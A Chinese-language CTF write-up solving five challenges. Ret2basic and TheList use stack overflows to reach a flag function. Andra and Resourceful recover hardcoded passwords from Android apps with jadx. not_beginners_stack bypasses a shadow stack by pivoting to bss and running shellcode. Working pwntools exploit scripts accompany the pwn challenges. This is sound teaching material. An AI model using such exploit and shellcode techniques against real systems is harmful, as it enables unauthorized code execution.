# Ret2basic

50 points

## 题目描述

查看文件信息，64位ELF文件，no canary。

![?code=NjcyMzFjOTNiYTk0NDU3MTNkNmQyMzdkZmM5YTA0YjlfUzNtMkY5UlBycHdzTWM4NExOV3RRMU5zM2dJbEtuWDBfVG9rZW46Ym94Y25hVEJoMVFRWVZtdFdUaHF2ODFtWkFlXzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

## 解题

IDA反编译，可以看到有一个简单的栈溢出漏洞。

![?code=N2E0YTM0YmU0MTBlNDU3MDdmZjgxMTI2OGZkNDAwOWRfaDNQcnBhZTFsSlhoVWJJRzhHb1NRU3RLS2lobDg5d2xfVG9rZW46Ym94Y25uQnNTd0RMY2E3UWk5eDFYaFRnaVBjXzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

win函数会输出flag。

![?code=Yzc3Y2YyZjJjZDZjNWM0YjExMDRkNzBlMmUyNDkyZjZfcUU1akd5S1BBNUZKejZzVFl4Q3VxWU5yMkdIRkVmY0VfVG9rZW46Ym94Y25XdGJiN2gwREVxajFXTXBkU3hEenp4XzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

所以栈溢出返回到win函数即可

## Exploit

`from pwn import * `

``

``

``

`context(arch='amd64',log_level='debug') `

``

``

``

`p=process('./ret2basic') `

``

`win_addr = 0x0401215 `

``

`payload = 'A'*0x70 + 'A'*0x08 + p64(win_addr) `

``

`p.sendlineafter('this?: ',payload) `

``

`p.interactive() `

``

![?code=M2NhYzA3Yzk5NzJiODlkZDQ1MzY5NmViM2UwNmQ2M2VfcXR5cWxlSXcwaklpREZudWtLUElYM3EzVkxBa2ZMZmFfVG9rZW46Ym94Y25LUzBBejhUZzlHTUFSUzZRWGR5UWliXzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

# TheList

452 points

## 题目描述

查看文件信息，64位ELF文件

![?code=MWIxM2E2NThkMjc5MjU4ZGQwMjI2ZDk3NjE0ZWIxZmZfT3F3RUpNWmJ0dzRnalFSWlNUUzBscFFiallSa2IzOW5fVG9rZW46Ym94Y25acG5rY2J5U1NVN2tYbDVybmFYNEFiXzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

运行the_list，基本功能是添加/修改/删除/显示用户名。

![?code=ODE1NjY5MDliOGZjZGUwNjU2MTY2OGYwYTQ5MmUxYWZfNHJxMlg1eU1TRDROQlY3d0lUWDhYQ3l6QUp5RlJ1eERfVG9rZW46Ym94Y25pUkw2YldMbElkSkEwM1NBbFoyN3ZkXzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

## 解题

IDA反编译，第一眼可以看到give_flag函数，这个函数会输出flag.txt的内容。

![?code=NzBjNTZmOTBjZWFjMmQ1ZTIzY2VkYjRjNWQyZWNjNmZfSkNDSnFtTFBqV3FFWVpnY1BvVjhudjlNRGNUTkhKV1RfVG9rZW46Ym94Y25ZY0VucncyZDM4c3BnNjdhS1djdFhkXzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

继续分析，add_user函数提示用户输入用户名，最多输入31个字符('\n'也算在内)。输入完成后，将相邻内存区域清空，以便下一次输入。另外调试可以发现最多添加16个用户名。

![?code=YmVhMzYyYWE3YzNlMTNjMTcyZWJhZmYwMDk2NTRkMDVfQW9rVzVncXFLbDBSZUtVbGMwT0VLUTFyMDR5U0RDMGZfVG9rZW46Ym94Y25OMG9meHR5RUpkTmhYSTVxSXVFdGlmXzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

分析change_name函数，最多输入79个字符('\n'也算在内)，并且没有对编号进行越界检查，所以可以通过不存在的编号进行栈上内容覆盖。

![?code=Yzc1N2Y1YTkzYjg4YWRjYTAxZDJkM2M4YzI1MjRiOTJfdVFRUFUyWWJlek1idE1UaGtDbWVXbW12ZVJjT05kc1dfVG9rZW46Ym94Y25wTTIzZDBjVlFxQ2VtNGRMVFNXd1llXzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

用gdb进行调试。

![?code=Nzk4NTNjODgxNWVhOGZhOGRlZTJlM2ZlYjMyZDcxZDFfV1VQZHF2Ynk3dEE5SGE2czJ1aWpzNG9HOGRxRzd0Tk5fVG9rZW46Ym94Y25vU2JZRzdTeTdoR1o1NlVPczhXeXNnXzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

可以看到，返回地址在0x7fffffffe318

![?code=MzhjMWQ5NGRjOGI2ZThkNjdhNDUwNzU5MmIyMWU1YzlfU1VmbDFobks3RjRhSUNvUTBNYmhlTzY5blZyVUZoaDdfVG9rZW46Ym94Y25hbVR6YmRXOHpvakZYUVhsWEhFcGplXzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

因此可以通过change_name(19)，将返回地址覆盖为give_flag函数地址。

## Exploit

`from pwn import * `

``

``

``

`#context(arch='amd64',log_level='debug') `

``

`p = process('./the_list') `

``

`give_flag_addr = 0x0401369 `

``

`p.sendlineafter('Enter your name: ', 'A') `

``

``

``

`for i in range(16): `

``

`p.sendlineafter('> ', '2') `

``

`p.sendlineafter("Enter the user's name: ", 'A') `

``

``

``

`payload = "A" * 0x08 + p64(give_flag_addr) `

``

`p.sendlineafter('> ', '4') `

``

`p.sendlineafter('What is the number for the user whose name you want to
change? ', '19') `

``

`p.sendlineafter("What is the new user's name? ", payload) `

``

``

``

`p.sendlineafter('> ', '5') `

``

`p.interactive() `

``

![?code=ODVjMzg4MWJjM2I0Zjg1NjllM2QwZDI4M2RhNDYwNWZfMXI0STRiRzk4WDVqUkUxeDR0QWN1UTJvVGE4MUVRbUJfVG9rZW46Ym94Y25rWEp6Y0hxWEltOEQ1SlFKcXdvR1FoXzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

# Andra

50 points

## 题目描述

模拟器里运行andra.apk。需要输入Name和password。

![?code=YjJkYmI4YTBhYzhlN2NkODAzMWM5MTdkZmI1YTBjMjNfRlZuRWZJUXdqS1l6VzJxdnhUcTBOUjdFS1RBM3JkVnVfVG9rZW46Ym94Y25keDNUdGZBcGJGaFpYbjdyUWhKZU1jXzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

## 解题

jadx反编译。

![?code=ZmNiYTExMTA2ZjUxMmQ3MDZiYTdlZDJlODc3OTY3YTNfVDlnTnc0YnZJWkFwZHpzcmlVMW9SRTBIcWM3cTl4OERfVG9rZW46Ym94Y25iemNxM0VCeUtJZlZCWE5PS3htSlh5XzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

可以看到登录Name和password为Nahamcom和pink_panther@786

在app里登录可以拿到flag。

![?code=MmJlOWNmMDJiNzczOTVmMjMyMmE4ZDcyODc2NTczYTFfQlhxM3BRV0xuZElPWUd5YWJ1Z2gxZGF4RXlyUzl5WGdfVG9rZW46Ym94Y25TMFR3ZUlsemhneEg4dzFaNkJOTjFlXzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

# Resourceful

50 points

## 题目描述

模拟器里运行resourceful.apk，需要输入password。

![?code=N2IzYTZhYzVhODE4NTQxYWExMmI4ODA2MzU4YjUzNDJfZU9MZDBIb0tnYXlpRGJGOUFRT3A2RVQxZHY4OVlnSlhfVG9rZW46Ym94Y25oUEdIMncydjBvWW9rQ29sWGpoUVZjXzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

## 解题

jadx反编译，可以拿到password为sUp3R_S3cRe7_P4s5w0Rd

![?code=ZTdhNjNjZWE4N2FmNTllNjE4ZWZkZDEwZWU1M2E5MjZfdklyVzhNbTRBVnowZHByOGNONXRudnZranR1eUFxd0pfVG9rZW46Ym94Y25yU0pUdm5oRFlwTEVlblhWTXZRczBmXzE2MTYxNDI4NjA6MTYxNjE0NjQ2MF9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

登录后拿到flag。

![?code=YmEyYjI2OGRkNzkwYWY1NjJlYTkzZmZhNTZlOTYzZDdfeDdzYmJoUHVRc2tncWdMN3U2bnlUM1RLcHlUQzFGZVZfVG9rZW46Ym94Y240cWVWT3U5S1VldkhuSldOanZ5YThkXzE2MTYxNDI4ODY6MTYxNjE0NjQ4Nl9WNA](https://image.3001.net/images/20200701/1593550745.png!small)

# not_beginners_stack

82points

## 题目描述

chall是一个64位ELF文件，保护全关。

![?code=OTZlOGNhM2FlOWFjZWYwY2MwOGJjYTljNjRhYmJmODlfaXVEVVJicWJ4bEljUVhIQ2hzb0gxUnVlTDl2bmdOUXpfVG9rZW46Ym94Y242Nmd2NWpQTFZ0SVRzdWplNk1qTVViXzE2MTYxNDMwMDM6MTYxNjE0NjYwM19WNA](https://image.3001.net/images/20200701/1593550745.png!small)

题目也给出了源代码main.S，其中vuln函数存在一个明显的栈溢出漏洞。

`vuln: `

``

`;; char buf[0x100]; `

``

`enter 0x100, 0 `

``

`;; write(1, "Data: ", 6); `

``

`mov edx, 6 `

``

`mov esi, msg_data `

``

`xor edi, edi `

``

`inc edi `

``

`call write `

``

`;; read(0, buf, 0x1000); `

``

`mov edx, 0x1000 ; [!] vulnerability `

``

`lea rsi, [rbp-0x100] `

``

`xor edi, edi `

``

`call read `

``

`;; return; `

``

`leave `

``

`ret `

``

但是，由于题目的设置，我们不能通过覆盖返回地址的方式利用该漏洞。原因如下：

`%macro call 1 `

``

`;; __stack_shadow[__stack_depth++] = return_address; `

``

`mov ecx, [__stack_depth] `

``

`mov qword [__stack_shadow + rcx * 8], %%return_address `

``

`inc dword [__stack_depth] `

``

`;; goto function `

``

`jmp %1 `

``

`%%return_address: `

``

`%endmacro `

``

``

``

`%macro ret 0 `

``

`;; goto __stack_shadow[--__stack_depth]; `

``

`dec dword [__stack_depth] `

``

`mov ecx, [__stack_depth] `

``

`jmp qword [__stack_shadow + rcx * 8] `

``

`%endmacro `

``

返回地址会保存在bss段，当函数退出时，再通过这个保存的返回地址跳转。

## 解题

`call vuln `

``

`;; write(1, "Data: ", 6); `

``

`mov edx, 6 `

``

`mov esi, msg_data `

``

`xor edi, edi `

``

`inc edi `

``

`call write `

``

`;; read(0, buf, 0x100); `

``

`mov edx, 0x100 `

``

`lea rsi, [rbp-0x100] `

``

`xor edi, edi `

``

`call read `

``

`;; return 0; `

``

`xor eax, eax `

``

`ret `

``

因为bss段是可写的，在vuln函数中第一次read时把RBP覆盖成fake
RBP，当vuln函数调用结束后，将栈迁移到bss段。并且此时的RBP会用于第二次read，这样的话通过构造bss段上的结构，我们最终能执行shellcode（NX是关闭的）。

![?code=ZGM0MThlZmE2ZmVmMDc5MjU2YWY4ZGJkNDIyMDY5ODRfODZEM1R6ZDNyOHBsM2lWbDlkTU9YZmdlVFdRZWI1dG1fVG9rZW46Ym94Y25PZHk5d0tVYTYxYzFGekdCVjBoU0FmXzE2MTYxNDMwMDM6MTYxNjE0NjYwM19WNA](https://image.3001.net/images/20200701/1593550745.png!small)

IDA中查看__stack_shadow地址。

![?code=N2QyODY3OWJmOGI4YTE2YmU2YmIwNTI5YmE4MjI5NWZfUEhWMU93M1ROU2Z1c1JQZ2dwUVl0S2o4SWEyRU5XUzNfVG9rZW46Ym94Y25wM1dYMWphVUpPa2wzcXlJem1UOEVoXzE2MTYxNDMwMDM6MTYxNjE0NjYwM19WNA](https://image.3001.net/images/20200701/1593550745.png!small)

由于返回地址会用[__stack_depth]计算，所以我们对这个变量进行进一步的分析。源程序和调试结果说明，当程序开始时，[__stack_depth]为0，每call一次，这个值就加1，每ret一次，这个值减1。

![?code=NDhlMTY1NDEzMTI4ZjhkZWQ5NTE0Zjc3OThlZGM5NGFfbm1PblpVaUtGblhERllja1g3UVNHeW9Cc1JoTXZlODVfVG9rZW46Ym94Y250ZU84cXpwSThNbTE5cUpDejVoamZkXzE2MTYxNDMwMDM6MTYxNjE0NjYwM19WNA](https://image.3001.net/images/20200701/1593550745.png!small)

当调用到vuln函数时，[__stack_depth]为2。

![?code=YzE3ZmM2MGU2YjA2ZjA0ODc5MGY5MjZhNzVmZWQyZjVfSGFNU1BaUTh6TU53RXZmZThna1hZNG1ZcVg0ME9hZHFfVG9rZW46Ym94Y25hVXlnVkpqOHZ1bFVrZ1plcjkzZDhmXzE2MTYxNDMwMDM6MTYxNjE0NjYwM19WNA](https://image.3001.net/images/20200701/1593550745.png!small)

那么当我们执行到第二次read时，[__stack_depth]的值为1。因此第二次read结束时，会跳转到[__stack_shadow + rcx *
8]=[0x0600234+1*8]=[0x060023c]。我们只需要将[0x060023c]设置成shellcode的地址即可。

![?code=YTE3M2YwMjY3ZDMyOGY4NjRmYTZlMDBiMDcyZjVhZDJfU29WM204Q3l6aFE2ZjR2eGd5VHhFYm4zbGpYUFJwaXRfVG9rZW46Ym94Y25qZmp2SFZBdnR5ZFd0ZlFCcmt4VGpjXzE2MTYxNDMwMDM6MTYxNjE0NjYwM19WNA](https://image.3001.net/images/20200701/1593550745.png!small)

## Exploit

`from pwn import * `

``

``

``

`context(os='linux', arch='amd64', log_level='debug') `

``

``

``

`elf = ELF("./chall") `

``

`p = remote("pwn.ctf.zer0pts.com", 9011) `

``

``

``

`# overwrite saved rbp `

``

`bss_addr = 0x0600234 #__stack_shadow `

``

`payload = b"A" * 0x100 `

``

`payload += p64(bss_addr + 0x100) `

``

`p.sendlineafter("Data: ", payload) `

``

``

``

`# construct fake stack `

``

`payload = p64(0)+p64(bss_addr+ 0x10) `

``

`print(shellcraft.sh()) `

``

`payload += asm(shellcraft.sh()) `

``

`p.sendlineafter("Data: ", payload) `

``

``

``

`p.interactive() `

``

成功拿到flag。

![?code=MTkzYzdjZmJhNzFiZmRmODczNjk5ZWM3NDgyNDY2MjJfa29mY05SeUQzWUR2U0JjMEVtd0RUMnRySlFjTkR6eUpfVG9rZW46Ym94Y25QNVY2SDRINXJYS3VIWnBhMlNYZWJiXzE2MTYxNDMwMDM6MTYxNjE0NjYwM19WNA](https://image.3001.net/images/20200701/1593550745.png!small)

  

